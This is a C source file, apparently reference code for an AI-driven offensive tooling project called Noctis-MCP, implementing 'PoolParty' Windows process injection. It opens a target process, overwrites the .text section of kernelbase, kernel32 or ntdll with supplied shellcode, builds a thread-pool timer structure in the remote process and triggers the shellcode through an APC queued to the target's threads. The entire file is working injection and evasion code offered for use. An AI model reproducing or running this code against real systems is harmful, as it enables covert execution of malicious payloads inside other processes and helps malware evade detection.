// Reference code for Noctis-MCP AI intelligence system
// PoolParty Process Injection Implementation

#include "poolparty.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

// Parse PE .text section from module base
BOOL PoolParty_GetTextSection(PVOID pModuleBase, PVOID* ppTextAddr, SIZE_T* pszTextSize) {
    if (!pModuleBase || !ppTextAddr || !pszTextSize) return FALSE;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection->Name, ".text", 5) == 0) {
            *ppTextAddr = (BYTE*)pModuleBase + pSection->VirtualAddress;
            *pszTextSize = pSection->Misc.VirtualSize;
            return TRUE;
        }
        pSection++;
    }

    return FALSE;
}

// Find suitable module for stomping in remote process
BOOL PoolParty_FindStompModule(HANDLE hProcess, PMODULE_STOMP_INFO pModuleInfo) {
    if (!hProcess || !pModuleInfo) return FALSE;

    ZeroMemory(pModuleInfo, sizeof(MODULE_STOMP_INFO));

    HMODULE hMods[1024];
    DWORD cbNeeded;

    // Enumerate modules in target process
    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        return FALSE;
    }

    // Search for suitable module (prefer kernelbase.dll or kernel32.dll)
    const char* preferredModules[] = { "kernelbase.dll", "kernel32.dll", "ntdll.dll" };

    for (int p = 0; p < 3; p++) {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char szModName[MAX_PATH];
            if (GetModuleBaseNameA(hProcess, hMods[i], szModName, sizeof(szModName))) {
                // Check if this is a preferred module
                if (_stricmp(szModName, preferredModules[p]) == 0) {
                    // Read module headers from remote process
                    BYTE headerBuffer[4096];
                    SIZE_T bytesRead;

                    if (!ReadProcessMemory(hProcess, hMods[i], headerBuffer, sizeof(headerBuffer), &bytesRead)) {
                        continue;
                    }

                    // Parse .text section
                    PVOID pTextAddr;
                    SIZE_T szTextSize;
                    if (PoolParty_GetTextSection(headerBuffer, &pTextAddr, &szTextSize)) {
                        // Calculate actual remote address
                        PVOID pRemoteTextAddr = (BYTE*)hMods[i] + ((BYTE*)pTextAddr - headerBuffer);

                        pModuleInfo->pModuleBase = hMods[i];
                        pModuleInfo->pTextSectionAddr = pRemoteTextAddr;
                        pModuleInfo->szTextSection = szTextSize;
                        strncpy_s(pModuleInfo->szModuleName, MAX_PATH, szModName, _TRUNCATE);

                        return TRUE;
                    }
                }
            }
        }
    }

    return FALSE;
}

// Perform module stomping - overwrite .text with shellcode
BOOL PoolParty_StompModule(
    HANDLE hProcess,
    PMODULE_STOMP_INFO pModuleInfo,
    PVOID pShellcode,
    SIZE_T szShellcodeSize
) {
    if (!hProcess || !pModuleInfo || !pShellcode || szShellcodeSize == 0) return FALSE;

    // Verify shellcode fits in .text section
    if (szShellcodeSize > pModuleInfo->szTextSection) return FALSE;

    // Backup original .text section
    pModuleInfo->pBackupBuffer = HeapAlloc(GetProcessHeap(), 0, pModuleInfo->szTextSection);
    if (!pModuleInfo->pBackupBuffer) return FALSE;

    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, pModuleInfo->pTextSectionAddr,
        pModuleInfo->pBackupBuffer, pModuleInfo->szTextSection, &bytesRead)) {
        HeapFree(GetProcessHeap(), 0, pModuleInfo->pBackupBuffer);
        pModuleInfo->pBackupBuffer = NULL;
        return FALSE;
    }

    // Change protection to RWX
    DWORD dwOldProtect;
    if (!VirtualProtectEx(hProcess, pModuleInfo->pTextSectionAddr,
        pModuleInfo->szTextSection, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }

    // Write shellcode
    SIZE_T bytesWritten;
    BOOL bResult = WriteProcessMemory(hProcess, pModuleInfo->pTextSectionAddr,
        pShellcode, szShellcodeSize, &bytesWritten);

    // Restore protection
    VirtualProtectEx(hProcess, pModuleInfo->pTextSectionAddr,
        pModuleInfo->szTextSection, dwOldProtect, &dwOldProtect);

    return bResult;
}

// Restore original module .text section
BOOL PoolParty_RestoreModule(HANDLE hProcess, PMODULE_STOMP_INFO pModuleInfo) {
    if (!hProcess || !pModuleInfo || !pModuleInfo->pBackupBuffer) return FALSE;

    // Change protection to RWX
    DWORD dwOldProtect;
    if (!VirtualProtectEx(hProcess, pModuleInfo->pTextSectionAddr,
        pModuleInfo->szTextSection, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }

    // Restore original bytes
    SIZE_T bytesWritten;
    BOOL bResult = WriteProcessMemory(hProcess, pModuleInfo->pTextSectionAddr,
        pModuleInfo->pBackupBuffer, pModuleInfo->szTextSection, &bytesWritten);

    // Restore protection
    VirtualProtectEx(hProcess, pModuleInfo->pTextSectionAddr,
        pModuleInfo->szTextSection, dwOldProtect, &dwOldProtect);

    // Free backup buffer
    HeapFree(GetProcessHeap(), 0, pModuleInfo->pBackupBuffer);
    pModuleInfo->pBackupBuffer = NULL;

    return bResult;
}

// Create TP_TIMER work item in remote process (simplified)
BOOL PoolParty_CreateTPTimer(HANDLE hProcess, PVOID pCallback, PVOID pContext, PVOID* ppTimer) {
    if (!hProcess || !pCallback || !ppTimer) return FALSE;

    // Allocate memory for TP_TIMER structure in remote process
    SIZE_T szTimerStruct = sizeof(FULL_TP_TIMER);
    PVOID pRemoteTimer = VirtualAllocEx(hProcess, NULL, szTimerStruct,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pRemoteTimer) return FALSE;

    // Initialize TP_TIMER structure
    FULL_TP_TIMER timer = { 0 };
    timer.Timer.Callback = pCallback;
    timer.Timer.Context = pContext;

    // Write timer structure to remote process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteTimer, &timer, sizeof(timer), &bytesWritten)) {
        VirtualFreeEx(hProcess, pRemoteTimer, 0, MEM_RELEASE);
        return FALSE;
    }

    *ppTimer = pRemoteTimer;
    return TRUE;
}

// Queue TP_TIMER to thread pool (trigger execution)
BOOL PoolParty_QueueTPTimer(HANDLE hProcess, PVOID pTimer) {
    if (!hProcess || !pTimer) return FALSE;

    // Get TpSetTimer from ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // Note: This is simplified. Full implementation requires:
    // 1. Resolving thread pool worker factory in target process
    // 2. Queuing work item to worker factory
    // 3. Signaling worker thread to process queue

    // For demonstration, we trigger via NtQueueApcThread to a worker thread
    // In production, use undocumented TpSetTimer/TpReleaseTimer functions

    typedef NTSTATUS(NTAPI* fnNtQueueApcThread)(
        HANDLE ThreadHandle,
        PVOID ApcRoutine,
        PVOID ApcArgument1,
        PVOID ApcArgument2,
        PVOID ApcArgument3
    );

    fnNtQueueApcThread pNtQueueApcThread = (fnNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
    if (!pNtQueueApcThread) return FALSE;

    // Find a thread in alertable wait state (thread pool worker)
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    DWORD dwTargetPID = GetProcessId(hProcess);
    BOOL bFound = FALSE;

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == dwTargetPID) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread) {
                    // Read timer structure to get callback
                    FULL_TP_TIMER timer;
                    SIZE_T bytesRead;
                    if (ReadProcessMemory(hProcess, pTimer, &timer, sizeof(timer), &bytesRead)) {
                        // Queue APC to execute callback
                        NTSTATUS status = pNtQueueApcThread(hThread, timer.Timer.Callback,
                            timer.Timer.Context, NULL, NULL);

                        if (status == 0) {
                            bFound = TRUE;
                            CloseHandle(hThread);
                            break;
                        }
                    }
                    // Always close handle before next iteration
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return bFound;
}

// Variant 7: TP_TIMER + Module Stomping (RECOMMENDED)
BOOL PoolParty_Variant7_TPTimer(PPOOLPARTY_CONTEXT pContext) {
    if (!pContext || !pContext->hProcess) return FALSE;

    // Find suitable module for stomping
    if (!PoolParty_FindStompModule(pContext->hProcess, &pContext->moduleInfo)) {
        return FALSE;
    }

    // Stomp module .text with shellcode
    if (!PoolParty_StompModule(pContext->hProcess, &pContext->moduleInfo,
        pContext->config.pShellcode, pContext->config.szShellcodeSize)) {
        return FALSE;
    }

    // Store shellcode address
    pContext->pRemoteShellcode = pContext->moduleInfo.pTextSectionAddr;

    // Create TP_TIMER work item
    PVOID pRemoteTimer = NULL;
    if (!PoolParty_CreateTPTimer(pContext->hProcess, pContext->pRemoteShellcode,
        NULL, &pRemoteTimer)) {
        PoolParty_RestoreModule(pContext->hProcess, &pContext->moduleInfo);
        return FALSE;
    }

    // Queue timer to thread pool (triggers execution)
    if (!PoolParty_QueueTPTimer(pContext->hProcess, pRemoteTimer)) {
        VirtualFreeEx(pContext->hProcess, pRemoteTimer, 0, MEM_RELEASE);
        PoolParty_RestoreModule(pContext->hProcess, &pContext->moduleInfo);
        return FALSE;
    }

    pContext->bInjected = TRUE;
    return TRUE;
}

// Initialize PoolParty context
BOOL PoolParty_Initialize(
    PPOOLPARTY_CONTEXT pContext,
    DWORD dwTargetPID,
    PVOID pShellcode,
    SIZE_T szShellcodeSize,
    POOLPARTY_VARIANT variant
) {
    if (!pContext || !pShellcode || szShellcodeSize == 0) return FALSE;

    ZeroMemory(pContext, sizeof(POOLPARTY_CONTEXT));

    // Open target process
    pContext->hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPID);
    if (!pContext->hProcess) {
        return FALSE;
    }

    // Store configuration
    pContext->config.dwTargetPID = dwTargetPID;
    pContext->config.pShellcode = pShellcode;
    pContext->config.szShellcodeSize = szShellcodeSize;
    pContext->config.variant = variant;
    pContext->config.bRestoreModule = TRUE;
    pContext->config.bUseModuleStomp = (variant == PP_VARIANT_TPTIMER);

    return TRUE;
}

// Execute PoolParty injection
BOOL PoolParty_Inject(PPOOLPARTY_CONTEXT pContext) {
    if (!pContext) return FALSE;

    switch (pContext->config.variant) {
        case PP_VARIANT_TPTIMER:
            return PoolParty_Variant7_TPTimer(pContext);

        // Other variants would be implemented here
        default:
            return FALSE;
    }
}

// Cleanup PoolParty context
VOID PoolParty_Cleanup(PPOOLPARTY_CONTEXT pContext) {
    if (!pContext) return;

    // Restore module if requested and backup exists
    if (pContext->config.bRestoreModule && pContext->moduleInfo.pBackupBuffer) {
        PoolParty_RestoreModule(pContext->hProcess, &pContext->moduleInfo);
    }

    // Close process handle
    if (pContext->hProcess) {
        CloseHandle(pContext->hProcess);
        pContext->hProcess = NULL;
    }

    SecureZeroMemory(pContext, sizeof(POOLPARTY_CONTEXT));
}
